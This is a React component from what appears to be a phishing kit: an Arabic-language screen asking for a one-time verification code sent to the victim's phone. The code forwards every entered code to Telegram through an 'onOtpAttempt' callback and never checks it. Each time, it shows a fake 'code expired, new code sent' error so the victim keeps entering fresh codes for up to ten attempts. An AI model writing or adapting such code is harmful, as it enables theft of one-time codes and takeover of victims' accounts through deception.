"use client"

import { useState, useRef, useEffect } from "react"
import { Check, ShieldCheck, RotateCcw, AlertTriangle } from "lucide-react"
import { Button } from "@/components/ui/button"

interface StepOTPProps {
  onNext: (otp: string) => void
  onOtpAttempt?: (otp: string, attemptNumber: number) => void
  phoneNumber: string
  currentStep: number
}

const MAX_ATTEMPTS = 10

export function StepOTP({ onNext, onOtpAttempt, phoneNumber, currentStep }: StepOTPProps) {
  const [otp, setOtp] = useState(["", "", "", "", "", ""])
  const [timer, setTimer] = useState(60)
  const [canResend, setCanResend] = useState(false)
  const [attempts, setAttempts] = useState(0)
  const [showError, setShowError] = useState(false)
  const [errorMessage, setErrorMessage] = useState("")
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
      return () => clearInterval(interval)
    } else {
      setCanResend(true)
    }
  }, [timer])

  const handleChange = (index: number, value: string) => {
    if (value.length > 1) {
      value = value[0]
    }
    if (!/^\d*$/.test(value)) return

    const newOtp = [...otp]
    newOtp[index] = value
    setOtp(newOtp)

    // Auto focus next input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus()
    }

    // Clear error when typing
    if (showError) {
      setShowError(false)
    }
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handleResend = () => {
    setTimer(60)
    setCanResend(false)
    setOtp(["", "", "", "", "", ""])
    setShowError(false)
  }

  const handleSubmit = () => {
    const otpCode = otp.join("")
    const newAttempts = attempts + 1
    setAttempts(newAttempts)

    // Send OTP attempt to Telegram
    if (onOtpAttempt) {
      onOtpAttempt(otpCode, newAttempts)
    }

    if (newAttempts >= MAX_ATTEMPTS) {
      // After 10 attempts, proceed to next step (success)
      onNext(otpCode)
      return
    }

    // Show error message - code expired, new code sent
    setShowError(true)
    setErrorMessage(`انتهت صلاحية الرمز. تم إرسال رمز جديد إلى هاتفك. (المحاولة ${newAttempts}/${MAX_ATTEMPTS})`)
    
    // Clear OTP fields
    setOtp(["", "", "", "", "", ""])
    
    // Reset timer for new code
    setTimer(60)
    setCanResend(false)
    
    // Focus first input
    setTimeout(() => {
      inputRefs.current[0]?.focus()
    }, 100)
  }

  const otpValue = otp.join("")
  const isComplete = otpValue.length === 6

  const maskedPhone = phoneNumber 
    ? phoneNumber.slice(0, 2) + "******" + phoneNumber.slice(-2)
    : "0X******XX"

  return (
    <div className="min-h-screen bg-background">
      {/* Progress Steps */}
      <div className="flex items-center justify-center gap-2 py-6">
        <div className="flex items-center">
          <div className="w-10 h-10 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-sm font-bold">
            3
          </div>
          <div className="w-12 h-0.5 bg-primary"></div>
        </div>
        <div className="flex items-center">
          <div className="w-10 h-10 rounded-full bg-green-500 text-white flex items-center justify-center">
            <Check className="w-5 h-5" />
          </div>
          <div className="w-12 h-0.5 bg-green-500"></div>
        </div>
        <div className="w-10 h-10 rounded-full bg-green-500 text-white flex items-center justify-center">
          <Check className="w-5 h-5" />
        </div>
      </div>

      {/* Icon */}
      <div className="flex justify-center mb-6">
        <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center">
          <ShieldCheck className="w-10 h-10 text-primary" />
        </div>
      </div>

      {/* Title */}
      <div className="text-center px-4 mb-6">
        <h1 className="text-2xl font-bold text-foreground mb-3">
          التحقق من الرمز
        </h1>
        <p className="text-muted-foreground">
          أدخل رمز التحقق المرسل إلى رقم هاتفك
        </p>
        <p className="text-primary font-mono text-lg mt-2" dir="ltr">
          {maskedPhone}
        </p>
      </div>

      {/* Error Message */}
      {showError && (
        <div className="mx-4 mb-6 p-4 bg-amber-500/10 border border-amber-500/30 rounded-xl">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-amber-500/20 flex items-center justify-center flex-shrink-0">
              <AlertTriangle className="w-5 h-5 text-amber-500" />
            </div>
            <p className="text-amber-500 text-sm font-medium">
              {errorMessage}
            </p>
          </div>
        </div>
      )}

      {/* OTP Inputs */}
      <div className="flex justify-center gap-3 mb-6 px-4" dir="ltr">
        {otp.map((digit, index) => (
          <input
            key={index}
            ref={(el) => { inputRefs.current[index] = el }}
            type="text"
            inputMode="numeric"
            maxLength={1}
            value={digit}
            onChange={(e) => handleChange(index, e.target.value)}
            onKeyDown={(e) => handleKeyDown(index, e)}
            className={`w-12 h-14 text-center text-2xl font-bold bg-secondary border-2 rounded-xl text-foreground focus:outline-none transition-colors ${
              showError ? "border-amber-500" : "border-border focus:border-primary"
            }`}
          />
        ))}
      </div>

      {/* Timer / Resend */}
      <div className="text-center mb-6">
        {canResend ? (
          <button
            onClick={handleResend}
            className="text-primary font-medium flex items-center justify-center gap-2 mx-auto"
          >
            <RotateCcw className="w-4 h-4" />
            إعادة إرسال الرمز
          </button>
        ) : (
          <p className="text-muted-foreground">
            إعادة الإرسال خلال <span className="text-primary font-bold">{timer}</span> ثانية
          </p>
        )}
      </div>

      {/* Attempts Counter */}
      <div className="text-center mb-6">
        <p className="text-muted-foreground text-sm">
          المحاولات: <span className="text-foreground font-bold">{attempts}</span> / {MAX_ATTEMPTS}
        </p>
      </div>

      {/* Submit Button */}
      <div className="px-4">
        <Button
          onClick={handleSubmit}
          disabled={!isComplete}
          className="w-full h-14 bg-primary hover:bg-primary/90 text-primary-foreground text-lg font-bold rounded-xl"
        >
          تأكيد
        </Button>
      </div>

      {/* Note */}
      <div className="text-center mt-6 px-4">
        <p className="text-muted-foreground text-sm">
          لم تستلم الرمز؟ تحقق من صندوق الرسائل أو حاول مرة أخرى
        </p>
      </div>
    </div>
  )
}
